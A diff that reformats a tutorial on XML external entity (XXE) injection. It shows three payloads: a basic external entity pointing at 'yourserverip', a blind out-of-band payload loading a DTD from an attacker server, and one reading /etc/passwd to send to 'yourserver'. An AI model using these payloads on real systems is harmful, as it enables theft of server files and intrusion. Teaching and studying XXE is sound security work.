@@ -40,10 +40,10 @@ Now when you provide any xml data, and that data is printing back to the user's 
 
 **Payload 1**:- 
 
-`<?xml version="1.0"?>`
-`<!DOCTYPE root [`
-`<!ENTITY test SYSTEM 'http://yourserverip/'>]>`
-`<root>&test;</root>`
+`<?xml version="1.0"?>`<br>
+`<!DOCTYPE root [`<br>
+`<!ENTITY test SYSTEM 'http://yourserverip/'>]>`<br>
+`<root>&test;</root>`<br>
 
 Now let's understand this. 
 
@@ -73,10 +73,10 @@ So we also needed to blind means we have to use blind payload which will grep th
 
 **Payload 2**:- 
 
-`<?xml version="1.0"?>`
-`<!DOCTYPE root [`
-`<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]>`
-`<root>&entity;</root>`
+`<?xml version="1.0"?>`<br>
+`<!DOCTYPE root [`<br>
+`<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]>`<br>
+`<root>&entity;</root>`<br>
 
 Your xml.dtd contents:- 
 
@@ -101,15 +101,15 @@ Let's see how all this works.
 
 Cool. 
 
-Now, Have anyone arise a question that why we call the dtd from attacker's server? Why not this below payload works?
+Now, *Have anyone arise a question that why **we call the dtd from attacker's server?** Why not this below payload works?*
 
 **Payload 3**:- 
 
-`<?xml version="1.0"?>`
-`<!DOCTYPE root [`
-`<!ENTITY % filecontents SYSTEM 'file:///etc/passwd>`
-`<!ENTITY test SYSTEM 'http://yourserver/%filecontents;'>]>`
-`<root>&test;</root>`
+`<?xml version="1.0"?>`<br>
+`<!DOCTYPE root [`<br>
+`<!ENTITY % filecontents SYSTEM 'file:///etc/passwd>`<br>
+`<!ENTITY test SYSTEM 'http://yourserver/%filecontents;'>]>`<br>
+`<root>&test;</root>`<br>
 
 this would be easier than before? Yes it is, but it is not going to work. 
 
